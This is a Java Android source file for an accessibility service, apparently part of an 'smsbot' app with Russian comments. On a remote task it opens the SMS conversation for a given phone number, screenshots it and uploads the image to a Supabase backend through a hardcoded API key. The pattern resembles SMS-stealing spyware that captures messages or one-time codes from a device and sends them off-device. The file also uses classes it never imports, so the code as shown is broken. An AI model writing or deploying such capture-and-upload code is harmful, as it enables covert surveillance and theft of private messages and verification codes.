package com.smsbot;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;

public class SmsAccessibilityService extends AccessibilityService {
    private static final String SUPABASE_URL = "https://xusnqiovgqgrxxyikvxk.supabase.co";
    private static final String SUPABASE_KEY = "sb_publishable_5Nr0YPv96-6cyQQKoDXlqg_OkhyqPvB";
    private String pendingPhone = null;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 500;
        info.packageNames = new String[]{"com.google.android.apps.messaging", "com.android.mms", "com.samsung.android.messaging"};
        setServiceInfo(info);
    }

    public void setPendingPhone(String phone) {
        this.pendingPhone = phone;
        openSmsApp();
    }

    private void openSmsApp() {
        // Открываем стандартное приложение Сообщения с конкретным номером
        Intent intent = new Intent(Intent.ACTION_SENDTO);
        intent.setData(Uri.parse("smsto:" + Uri.encode(pendingPhone)));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (pendingPhone == null) return;

        // Проверяем, что открыто окно сообщений с нужным номером
        if (event.getPackageName() != null && event.getPackageName().contains("mms")
                || event.getPackageName().contains("messaging")) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                // Ждём загрузки и делаем скриншот
                handler.postDelayed(() -> {
                    takeScreenshotAndUpload();
                    pendingPhone = null;
                }, 2000);
            }
        }
    }

    private void takeScreenshotAndUpload() {
        if (mediaProjection == null) {
            Log.e("SMS_ACCESS", "No MediaProjection");
            return;
        }
        ImageReader reader = null;
        VirtualDisplay vd = null;
        Image image = null;
        try {
            DisplayMetrics metrics = new DisplayMetrics();
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            wm.getDefaultDisplay().getRealMetrics(metrics);
            int w = metrics.widthPixels, h = metrics.heightPixels;
            reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
            vd = mediaProjection.createVirtualDisplay("screen_capture", w, h, metrics.densityDpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, null);
            Thread.sleep(800);
            image = reader.acquireLatestImage();
            if (image != null) {
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * w;
                Bitmap bitmap = Bitmap.createBitmap(w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);
                Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, w, h);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                cropped.compress(Bitmap.CompressFormat.JPEG, 80, baos);
                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                updateTaskInSupabase(pendingPhone, base64);
                bitmap.recycle();
                cropped.recycle();
            }
        } catch (Exception e) {
            Log.e("SMS_ACCESS", "Screenshot error", e);
        } finally {
            try { if (image != null) image.close(); } catch (Exception ignored) {}
            try { if (vd != null) vd.release(); } catch (Exception ignored) {}
            try { if (reader != null) reader.close(); } catch (Exception ignored) {}
        }
    }

    private void updateTaskInSupabase(String phone, String screenshotBase64) {
        try {
            // Ищем последнюю задачу по этому номеру и обновляем скриншот
            URL url = new URL(SUPABASE_URL + "/rest/v1/tasks?phone=eq." + phone + "&order=created_at.desc&limit=1");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestProperty("apikey", SUPABASE_KEY);
            conn.setRequestProperty("Authorization", "Bearer " + SUPABASE_KEY);
            conn.setRequestMethod("GET");
            if (conn.getResponseCode() != 200) return;
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            JSONObject task = new JSONArray(sb.toString()).getJSONObject(0);
            int taskId = task.getInt("id");

            JSONObject updateBody = new JSONObject();
            updateBody.put("screenshot", screenshotBase64);
            URL updateUrl = new URL(SUPABASE_URL + "/rest/v1/tasks?id=eq." + taskId);
            HttpURLConnection updateConn = (HttpURLConnection) updateUrl.openConnection();
            updateConn.setRequestMethod("PATCH");
            updateConn.setRequestProperty("apikey", SUPABASE_KEY);
            updateConn.setRequestProperty("Authorization", "Bearer " + SUPABASE_KEY);
            updateConn.setRequestProperty("Content-Type", "application/json");
            updateConn.setDoOutput(true);
            updateConn.getOutputStream().write(updateBody.toString().getBytes());
            updateConn.getResponseCode();
        } catch (Exception e) {
            Log.e("SMS_ACCESS", "Update error", e);
        }
    }

    public void setMediaProjection(MediaProjection mp) {
        this.mediaProjection = mp;
    }

    @Override
    public void onInterrupt() {}
}
